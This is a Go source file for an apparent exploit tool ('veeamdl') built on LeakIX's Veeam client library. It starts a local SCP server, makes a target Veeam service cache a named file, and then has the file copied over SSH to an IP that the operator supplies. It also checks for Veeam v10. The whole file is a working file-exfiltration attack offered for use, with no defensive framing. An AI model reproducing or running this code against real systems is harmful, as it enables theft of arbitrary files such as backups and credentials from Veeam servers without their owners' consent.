package main

import (
	"github.com/LeakIX/veeam-ds-client/cmd/veeamdl/scp_server"
	"github.com/LeakIX/veeam-ds-client/v11"
	"log"
	"os"
	"time"
)

func main() {
	if len(os.Args) < 4 {
		log.Fatalln("./veeamdl <target> <filename> <self-ip>")
	}
	target, filename, self := os.Args[1], os.Args[2], os.Args[3]
	go scp_server.StartScpServer()
	time.Sleep(1 * time.Second)
	log.Println("Preparing file for download")
	err := v11.CacheFile(target, filename)
	if err == v11.IsVeeam10Err {
		log.Fatalln("Found Veeam version v10")
	}
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Prepared file for download, requesting file")
	err = v11.DownloadFileSSH(target, filename, self)

	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Done")
}
